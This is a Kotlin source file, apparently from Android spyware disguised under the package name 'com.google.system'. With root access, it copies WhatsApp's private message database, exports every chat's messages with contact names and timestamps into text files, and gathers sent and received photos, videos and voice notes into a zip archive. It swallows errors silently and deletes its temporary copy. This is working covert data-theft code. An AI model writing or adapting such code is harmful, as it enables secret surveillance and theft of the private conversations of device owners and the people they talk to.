package com.google.system

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

internal fun extractWhatsAppAll(ctx: Context, hasRoot: Boolean, zos: ZipOutputStream, r: GrabResult) {
    if (!hasRoot) return
    try {
        val dbPath = "/data/data/com.whatsapp/databases/msgstore.db"
        val cacheCopy = File(ctx.cacheDir, "wa_msgstore_${System.currentTimeMillis()}.db")
        runCommand("cp $dbPath ${cacheCopy.absolutePath}")
        if (!cacheCopy.exists() || cacheCopy.length() < 1024) return

        val db = SQLiteDatabase.openDatabase(cacheCopy.absolutePath, null, SQLiteDatabase.OPEN_READONLY)
        try {
            val query = """SELECT c.wa_name, m.text_data, m.timestamp 
                FROM messages m 
                JOIN chat_view c ON m.chat_row_id = c._id 
                WHERE m.text_data IS NOT NULL 
                ORDER BY c.wa_name, m.timestamp ASC"""
            val cursor = db.rawQuery(query, null)
            val chatMap = linkedMapOf<String, MutableList<String>>()
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
            var msgCount = 0
            while (cursor.moveToNext()) {
                val contact = cursor.getString(0) ?: "Unknown"
                val text = cursor.getString(1) ?: ""
                val ts = cursor.getLong(2)
                val date = if (ts > 0) dateFormat.format(Date(ts * 1000)) else "unknown"
                val line = "[$date] $text"
                chatMap.getOrPut(contact) { mutableListOf() }.add(line)
                msgCount++
            }
            cursor.close()

            for ((contact, messages) in chatMap) {
                val safeName = contact.replace("/", "_").replace(":", "_").replace(" ", "_").take(50)
                val content = buildString {
                    appendLine("=== WhatsApp Chat: $contact ===")
                    appendLine("Total messages: ${messages.size}")
                    appendLine("Exported: ${dateFormat.format(Date())}")
                    appendLine()
                    messages.forEach { appendLine(it) }
                }
                zos.putNextEntry(ZipEntry("whatsapp/chats/${safeName}.txt"))
                zos.write(content.toByteArray())
                zos.closeEntry()
                r.files++
                r.size += content.length
            }

            r.whatsappChats = chatMap.size
            r.whatsappMessages = msgCount

            val mediaDir = File("/data/data/com.whatsapp/files/Media")
            if (mediaDir.exists()) {
                scanWhatsAppMedia(mediaDir, zos, r)
            }
        } finally {
            db.close()
            cacheCopy.delete()
        }
    } catch (_: Exception) {}
}

internal fun scanWhatsAppMedia(dir: File, zos: ZipOutputStream, r: GrabResult) {
    if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
    try {
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
            if (f.isDirectory) {
                if (f.name.equals("Sent", ignoreCase = true) || f.name.equals("Received", ignoreCase = true)) {
                    scanWhatsAppMedia(f, zos, r)
                }
            } else if (f.isFile && f.length() in 1024..MAX_FILE) {
                val ext = f.extension.lowercase()
                if (ext in listOf("jpg", "jpeg", "png", "gif", "mp4", "avi", "ogg", "opus", "m4a")) {
                    if (zip(f, "whatsapp/media/${f.name}", zos)) {
                        r.files++; r.size += f.length()
                    }
                }
            }
        }
    } catch (_: Exception) {}
}
